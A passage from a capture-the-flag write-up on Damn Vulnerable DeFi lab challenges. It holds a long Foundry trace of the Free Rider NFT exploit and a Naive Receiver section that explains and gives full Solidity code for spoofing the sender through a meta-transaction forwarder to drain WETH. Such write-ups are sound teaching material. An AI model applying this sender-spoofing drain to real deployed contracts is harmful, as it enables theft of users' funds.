    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   │   │   │   ├─ [31045] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">0, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">1, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">1)</span>
    <span class="s">│   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">1, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">2, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">2)</span>
    <span class="s">│   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">2, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">3, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">3)</span>
    <span class="s">│   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">3, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [14460] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">4, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">4)</span>
    <span class="s">│   │   │   │   ├─ [7145] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">4, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [21967] DamnValuableNFT::safeTransferFrom(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="s">5, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">5)</span>
    <span class="s">│   │   │   │   ├─ [14652] FreeRiderRecoveryManager::onERC721Received(FreeRiderAttacker: [0xce110ab5927CC46905460D930CCa0c6fB4666219], FreeRiderAttacker</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="s">5, 0x00000000000000000000000044e97af4418b7a17aabd8090bea0a471a366305c)</span>
    <span class="s">│   │   │   │   │   ├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Return] FreeRiderRecoveryManager</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span>
    <span class="s">│   │   │   │   │   ├─ [0] player::fallback{value: 45000000000000000000}()</span>
    <span class="s">│   │   │   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   │   │   └─ ← [Return] 0x150b7a02</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [24345] WETH::deposit{value: 15045135406218655968}()</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from</span><span class="pi">:</span> <span class="s">0x0000000000000000000000000000000000000000, to</span><span class="na">: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">15045135406218655968 [1.504e19])</span>
    <span class="na">│   │   │   │   ├─ emit Deposit(who: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount</span><span class="pi">:</span> <span class="s">15045135406218655968 [1.504e19])</span>
    <span class="s">│   │   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   │   ├─ [3607] WETH::transfer(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, 15045135406218655968 [1.504e19])</span>
    <span class="na">│   │   │   │   ├─ emit Transfer(from: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">to</span><span class="pi">:</span> <span class="s">0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190, amount</span><span class="err">:</span> <span class="s">15045135406218655968 [1.504e19])</span>
    <span class="s">│   │   │   │   └─ ← [Return] </span><span class="kc">true</span>
    <span class="s">│   │   │   └─ ← [Stop]</span>
    <span class="s">│   │   ├─ [825] WETH::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 9000045135406218655968 [9e21]</span>
    <span class="s">│   │   ├─ [2802] DamnValuableToken::balanceOf(0xb86E50e24Ba2B0907f281cF6AAc8C1f390030190) [staticcall]</span>
    <span class="s">│   │   │   └─ ← [Return] 15000000000000000000000 [1.5e22]</span>
    <span class="na">│   │   ├─ emit Sync(reserve0</span><span class="pi">:</span> <span class="s">9000045135406218655968 [9e21], reserve1</span><span class="err">:</span> <span class="s">15000000000000000000000 [1.5e22])</span>
    <span class="na">│   │   ├─ emit Swap(sender: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="err">,</span> <span class="na">amount0In</span><span class="pi">:</span> <span class="s">15045135406218655968 [1.504e19], amount1In</span><span class="err">:</span> <span class="s">0, amount0Out</span><span class="err">:</span> <span class="s">15000000000000000000 [1.5e19], amount1Out</span><span class="err">:</span> <span class="s">0, to</span><span class="na">: FreeRiderAttacker</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xce110ab5927CC46905460D930CCa0c6fB4666219</span><span class="pi">]</span><span class="s">)</span>
    <span class="s">│   │   └─ ← [Stop]</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [0] VM::stopPrank()</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [29235] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">0)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">0)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(0) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">1)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">1)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(1) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">2)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">2)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(2) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">3)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">3)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(3) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">4)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">4)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(4) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::prank(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA])</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [5335] DamnValuableNFT::transferFrom(FreeRiderRecoveryManager: [0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="s">5)</span>
    <span class="na">│   ├─ emit Transfer(from: FreeRiderRecoveryManager</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0xa5906e11c3b7F5B832bcBf389295D44e7695b4A6</span><span class="pi">]</span><span class="err">,</span> <span class="na">to: recoveryManagerOwner</span><span class="pi">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="err">,</span> <span class="na">tokenId</span><span class="pi">:</span> <span class="s">5)</span>
    <span class="s">│   └─ ← [Stop]</span>
    <span class="s">├─ [1051] DamnValuableNFT::ownerOf(5) [staticcall]</span>
    <span class="s">│   └─ ← [Return] recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span>
    <span class="s">├─ [0] VM::assertEq(recoveryManagerOwner: [0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA], recoveryManagerOwner</span><span class="err">:</span> <span class="pi">[</span><span class="nv">0x8202e87CCCc6cc631040a3dD1b7A1A54Fbbc47aA</span><span class="pi">]</span><span class="s">) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [425] FreeRiderNFTMarketplace::offersCount() [staticcall]</span>
    <span class="s">│   └─ ← [Return] </span><span class="m">0</span>
    <span class="s">├─ [0] VM::assertEq(0, 0) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertLt(15000000000000000000 [1.5e19], 90000000000000000000 [9e19]) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertGt(45060000000000000000 [4.506e19], 45000000000000000000 [4.5e19]) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">├─ [0] VM::assertEq(0, 0) [staticcall]</span>
    <span class="s">│   └─ ← [Return]</span>
    <span class="s">└─ ← [Stop]</span>

<span class="na">Suite result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 12.62ms (4.17ms CPU time)</span>

</code></pre></div></div>

<hr />

<h2 id="naive-receiver-challenge">Naive Receiver Challenge</h2>

<hr />

<h3 id="challenge-overview-3">Challenge Overview</h3>

<p>This challenge exploits an <strong>access control flaw</strong> in a meta-transaction system combined with a flashloan fee mechanism. A vulnerable pool offers flashloans with a fixed 1 WETH fee. The victim (user) has a receiver contract with 10 WETH balance and unknowingly becomes the target of draining attacks via flashloans.</p>

<p>The objective is to <strong>drain all WETH</strong> from both the pool and the user’s receiver contract, and deposit the funds into a designated recovery address.</p>

<hr />

<h3 id="smart-contract-breakdown">Smart Contract Breakdown</h3>

<h4 id="key-contracts">Key Contracts</h4>
<ul>
  <li><strong>NaiveReceiverPool</strong>: Offers flashloans of WETH with a fixed fee of 1 WETH per call.</li>
  <li><strong>FlashLoanReceiver</strong>: A sample user-deployed contract able to receive flashloans.</li>
  <li><strong>BasicForwarder</strong>: A meta-transaction forwarder that allows execution of calls on behalf of users via valid signatures.</li>
</ul>

<h4 id="important-mechanisms">Important Mechanisms</h4>
<ul>
  <li><strong>flashLoan(address receiver, address token, uint256 amount, bytes calldata data)</strong><br />
Executes a flashloan and charges a 1 WETH fee, regardless of loan amount.</li>
  <li><strong>multicall(bytes[] calldata data)</strong><br />
Allows batching of multiple calls in a single transaction.</li>
  <li><strong>forwarder.execute(request, signature)</strong><br />
Permits off-chain signed execution of calls via the meta-transaction forwarder.</li>
</ul>

<hr />

<h3 id="️-vulnerability-explained">⚠️ Vulnerability Explained</h3>

<p>The <strong>forwarder</strong> blindly trusts the sender field embedded in the calldata of <code class="language-plaintext highlighter-rouge">withdraw()</code> when processed via <code class="language-plaintext highlighter-rouge">multicall()</code>. This creates a <strong>spoofable sender</strong> situation. An attacker can:</p>
<ol>
  <li>Encode a series of flashloan calls to drain the victim receiver’s balance.</li>
  <li>Add a <code class="language-plaintext highlighter-rouge">withdraw()</code> call to extract all funds from the pool by spoofing ownership using <code class="language-plaintext highlighter-rouge">abi.encodePacked(...)</code>.</li>
  <li>Sign the entire payload off-chain and have the forwarder execute it.</li>
</ol>

<hr />

<h3 id="exploit-strategy-2">Exploit Strategy</h3>

<ol>
  <li>Encode 10 consecutive flashloans that charge the victim’s receiver 1 WETH each (draining 10 WETH total).</li>
  <li>Encode a <code class="language-plaintext highlighter-rouge">withdraw()</code> call that drains both pool and receiver funds.</li>
  <li>Combine calls using <code class="language-plaintext highlighter-rouge">multicall()</code>.</li>
  <li>Forge the sender identity by packing the deployer address at the end of the call data.</li>
  <li>Execute the entire call using <code class="language-plaintext highlighter-rouge">forwarder.execute()</code> with a valid EIP-712 signature.</li>
</ol>

<hr />

<h3 id="exploit-code-solidity">Exploit Code (Solidity)</h3>

<pre><code class="language-solidity">function test_naiveReceiver() public checkSolvedByPlayer {
    bytes ;

    for (uint i = 0; i &lt; 10; i++) {
        callDatas[i] = abi.encodeCall(
            NaiveReceiverPool.flashLoan,
            (receiver, address(weth), 0, "0x")
        );
    }

    callDatas[10] = abi.encodePacked(
        abi.encodeCall(
            NaiveReceiverPool.withdraw,
            (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
        ),
        bytes32(uint256(uint160(deployer)))
    );

    bytes memory multicallData = abi.encodeCall(pool.multicall, callDatas);

    BasicForwarder.Request memory request = BasicForwarder.Request(
        player,
        address(pool),
        0,
        gasleft(),
        forwarder.nonces(player),
        multicallData,
        1 days
    );

    bytes32 requestHash = keccak256(
        abi.encodePacked(
            "\x19\x01",
            forwarder.domainSeparator(),
            forwarder.getDataHash(request)
        )
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, requestHash);
    bytes memory signature = abi.encodePacked(r, s, v);

    forwarder.execute(request, signature);
}
</code></pre>

<h3 id="proof-of-exploit-3">Proof of Exploit:</h3>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="na">simple to explain test case </span><span class="pi">:</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">test_naiveReceiver() (gas</span><span class="pi">:</span> <span class="s">477289)</span>
<span class="na">Balance assertions</span><span class="pi">:</span>
<span class="na">WETH in FlashLoanReceiver</span><span class="pi">:</span> <span class="m">0</span>
<span class="na">WETH in NaiveReceiverPool</span><span class="pi">:</span> <span class="m">0</span>
